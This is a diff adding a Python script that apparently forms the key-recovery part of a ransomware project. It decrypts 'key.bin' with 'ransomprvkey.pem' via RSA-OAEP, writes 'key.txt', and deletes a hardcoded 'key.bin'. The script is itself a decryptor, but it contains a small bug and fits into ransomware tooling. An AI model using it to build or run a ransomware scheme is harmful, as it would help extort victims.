@@ -1,0 +1,43 @@
+from Crypto.PublicKey import RSA 
+from Crypto.Cipher import AES, PKCS1_OAEP 
+import os
+import sys 
+
+file_in = ''
+private_key = ''
+#handles and checks for "key.bin"
+while True:
+	try:
+		print('Locate \"key.bin\":')
+		key=input()
+		if(key=='q'):
+			break
+			exit()
+		file_in = open(key, "rb") 
+		break
+		
+	except:
+		print("Incorrect location of key.bin,renter location or press ctrl z to quit")
+#handles and checks for "ransomprvkey.pem"
+while True:
+	try:
+		print('Locate \"ransomprvkey.pem\":')
+		privatekey=input()
+		private_key = RSA.import_key(open(privatekey).read()) 
+		break
+	except:
+		print("Incorrect location of ransomprvkey.pem,renter location or press ctrl z to quit")
+#handles and checks for "handles and retrieves decoded data"
+try:	
+	enc_data = file_in.read(private_key.size_in_bytes()) 
+	cipher_rsa = PKCS1_OAEP.new(private_key) 
+	data = cipher_rsa.decrypt(enc_data) 
+	file_in.close() 
+	f = open("key.txt", "w")
+	f.write(data.decode("utf-8") )
+	f.close()
+except:
+	print("Files given are incorrect , please restart this program and provide the correct files") 
+	exit()
+print('\"key.bin\" is recovered and it is now called \"key.txt\"')
+os.remove("key.bin")
